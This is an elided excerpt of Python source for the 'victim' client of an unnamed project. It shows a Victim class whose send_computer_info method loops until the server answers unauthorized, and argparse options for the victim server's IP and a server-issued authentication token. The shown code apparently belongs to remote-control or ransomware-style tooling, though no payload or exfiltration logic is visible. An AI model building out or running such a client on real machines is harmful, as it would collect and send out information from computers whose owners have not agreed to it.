...
class Victim:
    ...
    def send_computer_info(self):
        ...
        while (
            ...
            and status_code != HTTPStatus.UNAUTHORIZED
        ):
...
def get_config():
    parser = argparse.ArgumentParser(
        prog=f"{__app_name__} victim",
        description=f"The victim for the {__app_name__} project",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument(
        "-i", "--ip", type=str, required=True, help="The ip of the victim server"
    )
    ...
    parser.add_argument(
        ...
        type=str,
        required=True,
        help=f"Authentication token generated by a {__app_name__} server.",
    )
    ...
    parser.add_argument(
        ...
        "-v",
        action="version",
        version=f"{__app_name__} victim v{__version__}",
    )
